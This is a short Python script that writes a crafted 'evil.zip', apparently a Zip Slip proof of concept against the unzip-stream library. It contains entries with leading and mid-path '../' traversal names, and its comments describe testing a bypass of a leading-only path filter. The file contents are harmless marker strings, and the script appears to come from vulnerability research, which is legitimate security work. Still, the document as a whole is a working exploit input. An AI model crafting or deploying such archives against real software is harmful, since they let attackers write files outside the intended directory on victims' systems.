import zipfile
with zipfile.ZipFile('evil.zip', 'w') as z:
    # leading traversal (known-stripped by unzip-stream) - control group
    z.writestr('../ZIPSLIP-PROOF.txt', 'POISONED-LEADING-STRIPPED')
    # mid-path traversal (bypass candidate: leading-only regex miss)
    z.writestr('d/../../ZIPSLIP-PROOF-4.txt', 'POISONED-MIDPATH-ESCAPED')
    z.writestr('d/../../../ZIPSLIP-PROOF-5.txt', 'POISONED-MIDPATH-LEVEL2')
print('zip written')
